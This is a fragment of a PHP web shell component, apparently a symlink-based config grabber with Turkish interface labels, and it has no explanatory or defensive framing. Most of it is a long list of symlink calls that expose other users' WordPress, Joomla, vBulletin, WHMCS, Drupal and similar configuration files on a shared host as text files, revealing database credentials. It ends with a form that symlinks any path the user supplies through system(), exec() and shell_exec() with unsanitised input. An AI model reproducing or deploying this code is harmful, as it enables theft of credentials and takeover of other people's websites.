        symlink('/home/'.$sitess.'/public_html/beta/wp-config.php',$sitess.'-wp13-beta.txt');
        symlink('/home/'.$sitess.'/public_html/press/wp-config.php',$sitess.'-wp13-press.txt');
        symlink('/home/'.$sitess.'/public_html/wordpress/wp-config.php',$sitess.'-wp13-wordpress.txt');
        symlink('/home/'.$sitess.'/public_html/Wordpress/wp-config.php',$sitess.'-wp13-Wordpress.txt');
        symlink('/home/'.$sitess.'/public_html/blog/wp-config.php',$sitess.'-wp13-Wordpress.txt');
        symlink('/home/'.$sitess.'/public_html/wordpress/beta/wp-config.php',$sitess.'-wp13-wordpress-beta.txt');
        symlink('/home/'.$sitess.'/public_html/news/wp-config.php',$sitess.'-wp13-news.txt');
        symlink('/home/'.$sitess.'/public_html/new/wp-config.php',$sitess.'-wp13-new.txt');
        symlink('/home/'.$sitess.'/public_html/blog/wp-config.php',$sitess.'-wp-blog.txt');
        symlink('/home/'.$sitess.'/public_html/beta/wp-config.php',$sitess.'-wp-beta.txt');
        symlink('/home/'.$sitess.'/public_html/blogs/wp-config.php',$sitess.'-wp-blogs.txt');
        symlink('/home/'.$sitess.'/public_html/home/wp-config.php',$sitess.'-wp-home.txt');
        symlink('/home/'.$sitess.'/public_html/protal/wp-config.php',$sitess.'-wp-protal.txt');
        symlink('/home/'.$sitess.'/public_html/site/wp-config.php',$sitess.'-wp-site.txt');
        symlink('/home/'.$sitess.'/public_html/main/wp-config.php',$sitess.'-wp-main.txt');
        symlink('/home/'.$sitess.'/public_html/test/wp-config.php',$sitess.'-wp-test.txt');
        symlink('/home/'.$sitess.'/public_html/arcade/functions/dbclass.php',$sitess.'-ibproarcade.txt');
        symlink('/home/'.$sitess.'/public_html/arcade/functions/dbclass.php',$sitess.'-ibproarcade.txt');
        symlink('/home/'.$sitess.'/public_html/joomla/configuration.php',$sitess.'-joomla2.txt');
        symlink('/home/'.$sitess.'/public_html/protal/configuration.php',$sitess.'-joomla-protal.txt');
        symlink('/home/'.$sitess.'/public_html/joo/configuration.php',$sitess.'-joo.txt');
        symlink('/home/'.$sitess.'/public_html/cms/configuration.php',$sitess.'-joomla-cms.txt');
        symlink('/home/'.$sitess.'/public_html/site/configuration.php',$sitess.'-joomla-site.txt');
        symlink('/home/'.$sitess.'/public_html/main/configuration.php',$sitess.'-joomla-main.txt');
        symlink('/home/'.$sitess.'/public_html/news/configuration.php',$sitess.'-joomla-news.txt');
        symlink('/home/'.$sitess.'/public_html/new/configuration.php',$sitess.'-joomla-new.txt');
        symlink('/home/'.$sitess.'/public_html/home/configuration.php',$sitess.'-joomla-home.txt');
        symlink('/home/'.$sitess.'/public_html/vb/includes/config.php',$sitess.'-vb-config.txt');
        symlink('/home/'.$sitess.'/public_html/vb3/includes/config.php',$sitess.'-vb3-config.txt');
        symlink('/home/'.$sitess.'/public_html/cc/includes/config.php',$sitess.'-vb1-config.txt');
        symlink('/home/'.$sitess.'/public_html/includes/config.php',$sitess.'-includes-vb.txt');
        symlink('/home/'.$sitess.'/public_html/forum/includes/class_core.php',$sitess.'-vbluttin-class_core.php.txt');
        symlink('/home/'.$sitess.'/public_html/vb/includes/class_core.php',$sitess.'-vbluttin-class_core.php1.txt');
        symlink('/home/'.$sitess.'/public_html/cc/includes/class_core.php',$sitess.'-vbluttin-class_core.php2.txt');
        symlink('/home/'.$sitess.'/public_html/whm/configuration.php',$sitess.'-whm15.txt');
        symlink('/home/'.$sitess.'/public_html/central/configuration.php',$sitess.'-whm-central.txt');
        symlink('/home/'.$sitess.'/public_html/whm/whmcs/configuration.php',$sitess.'-whm-whmcs.txt');
        symlink('/home/'.$sitess.'/public_html/whm/WHMCS/configuration.php',$sitess.'-whm-WHMCS.txt');
        symlink('/home/'.$sitess.'/public_html/whmc/WHM/configuration.php',$sitess.'-whmc-WHM.txt');
        symlink('/home/'.$sitess.'/public_html/whmcs/configuration.php',$sitess.'-whmcs.txt');
        symlink('/home/'.$sitess.'/public_html/support/configuration.php',$sitess.'-support.txt');
        symlink('/home/'.$sitess.'/public_html/supp/configuration.php',$sitess.'-supp.txt');
        symlink('/home/'.$sitess.'/public_html/secure/configuration.php',$sitess.'-sucure.txt');
        symlink('/home/'.$sitess.'/public_html/secure/whm/configuration.php',$sitess.'-sucure-whm.txt');
        symlink('/home/'.$sitess.'/public_html/secure/whmcs/configuration.php',$sitess.'-sucure-whmcs.txt');
        symlink('/home/'.$sitess.'/public_html/cpanel/configuration.php',$sitess.'-cpanel.txt');
        symlink('/home/'.$sitess.'/public_html/panel/configuration.php',$sitess.'-panel.txt');
        symlink('/home/'.$sitess.'/public_html/host/configuration.php',$sitess.'-host.txt');
        symlink('/home/'.$sitess.'/public_html/hosting/configuration.php',$sitess.'-hosting.txt');
        symlink('/home/'.$sitess.'/public_html/hosts/configuration.php',$sitess.'-hosts.txt');
        symlink('/home/'.$sitess.'/public_html/configuration.php',$sitess.'-joomla.txt');
        symlink('/home/'.$sitess.'/public_html/submitticket.php',$sitess.'-whmcs2.txt');
        symlink('/home/'.$sitess.'/public_html/clients/configuration.php',$sitess.'-clients.txt');
        symlink('/home/'.$sitess.'/public_html/client/configuration.php',$sitess.'-client.txt');
        symlink('/home/'.$sitess.'/public_html/clientes/configuration.php',$sitess.'-clientes.txt');
        symlink('/home/'.$sitess.'/public_html/cliente/configuration.php',$sitess.'-client.txt');
        symlink('/home/'.$sitess.'/public_html/clientsupport/configuration.php',$sitess.'-clientsupport.txt');
        symlink('/home/'.$sitess.'/public_html/billing/configuration.php',$sitess.'-billing.txt'); 
        symlink('/home/'.$sitess.'/public_html/manage/configuration.php',$sitess.'-whm-manage.txt'); 
        symlink('/home/'.$sitess.'/public_html/my/configuration.php',$sitess.'-whm-my.txt'); 
        symlink('/home/'.$sitess.'/public_html/myshop/configuration.php',$sitess.'-whm-myshop.txt'); 
        symlink('/home/'.$sitess.'/public_html/includes/dist-configure.php',$sitess.'-zencart.txt'); 
        symlink('/home/'.$sitess.'/public_html/zencart/includes/dist-configure.php',$sitess.'-shop-zencart.txt'); 
        symlink('/home/'.$sitess.'/public_html/shop/includes/dist-configure.php',$sitess.'-shop-ZCshop.txt'); 
        symlink('/home/'.$sitess.'/public_html/Settings.php',$sitess.'-smf.txt'); 
        symlink('/home/'.$sitess.'/public_html/smf/Settings.php',$sitess.'-smf2.txt'); 
        symlink('/home/'.$sitess.'/public_html/forum/Settings.php',$sitess.'-smf-forum.txt'); 
        symlink('/home/'.$sitess.'/public_html/forums/Settings.php',$sitess.'-smf-forums.txt'); 
        symlink('/home/'.$sitess.'/public_html/upload/includes/config.php',$sitess.'-up.txt');
        symlink('/home/'.$sitess.'/public_html/article/config.php',$sitess.'-Nwahy.txt'); 
        symlink('/home/'.$sitess.'/public_html/up/includes/config.php',$sitess.'-up2.txt');
        symlink('/home/'.$sitess.'/public_html/conf_global.php',$sitess.'-6.txt');
        symlink('/home/'.$sitess.'/public_html/include/db.php',$sitess.'-7.txt');
        symlink('/home/'.$sitess.'/public_html/connect.php',$sitess.'-PHP-Fusion.txt');
        symlink('/home/'.$sitess.'/public_html/mk_conf.php',$sitess.'-9.txt');
        symlink('/home/'.$sitess.'/public_html/includes/config.php',$sitess.'-traidnt1.txt');
        symlink('/home/'.$sitess.'/public_html/config.php',$sitess.'-4images.txt');
        symlink('/home/'.$sitess.'/public_html/sites/default/settings.php',$sitess.'-Drupal.txt');
        symlink('/home/'.$sitess.'/public_html/member/configuration.php',$sitess.'-1member.txt') ; 
        symlink('/home/'.$sitess.'/public_html/billings/configuration.php',$sitess.'-billings.txt') ; 
        symlink('/home/'.$sitess.'/public_html/whm/configuration.php',$sitess.'-whm.txt');
        symlink('/home/'.$sitess.'/public_html/supports/configuration.php',$sitess.'-supports.txt');
        symlink('/home/'.$sitess.'/public_html/requires/config.php',$sitess.'-AM4SS-hosting.txt');
        symlink('/home/'.$sitess.'/public_html/supports/includes/iso4217.php',$sitess.'-hostbills-supports.txt');
        symlink('/home/'.$sitess.'/public_html/client/includes/iso4217.php',$sitess.'-hostbills-client.txt');
        symlink('/home/'.$sitess.'/public_html/support/includes/iso4217.php',$sitess.'-hostbills-support.txt');
        symlink('/home/'.$sitess.'/public_html/billing/includes/iso4217.php',$sitess.'-hostbills-billing.txt');
        symlink('/home/'.$sitess.'/public_html/billings/includes/iso4217.php',$sitess.'-hostbills-billings.txt');
        symlink('/home/'.$sitess.'/public_html/host/includes/iso4217.php',$sitess.'-hostbills-host.txt');
        symlink('/home/'.$sitess.'/public_html/hosts/includes/iso4217.php',$sitess.'-hostbills-hosts.txt');
        symlink('/home/'.$sitess.'/public_html/hosting/includes/iso4217.php',$sitess.'-hostbills-hosting.txt');
        symlink('/home/'.$sitess.'/public_html/hostings/includes/iso4217.php',$sitess.'-hostbills-hostings.txt');
        symlink('/home/'.$sitess.'/public_html/includes/iso4217.php',$sitess.'-hostbills.txt');
        symlink('/home/'.$sitess.'/public_html/hostbills/includes/iso4217.php',$sitess.'-hostbills-hostbills.txt');
        symlink('/home/'.$sitess.'/public_html/hostbill/includes/iso4217.php',$sitess.'-hostbills-hostbill.txt');
    }
}
?>

<form method='post'><center>
<p>Manuel Symlink</p>
<input type='text' name='dosya' value='Dosya'></input>
<input type='text' name='isim' value='cikti.txt'></input><br><br>
<input type='submit' name='cek' value='Çek'></input>
</form>
</center>
<?php
if($_POST['cek']){
    $dosya = $_POST['dosya'];
    $isim = $_POST['isim'];
    mkdir("alaconf");
    chmod("alaconf",0777);
    chdir("alaconf");
    if(symlink($dosya,$isim));
    else{
        if(system("ln -s {$dosya} {$isim}"));
        else{
            if(exec("ln -s {$dosya} {$isim}"));
            else{
                shell_exec("ln -s {$dosya} {$isim}");
            }
        }
    }
}
?>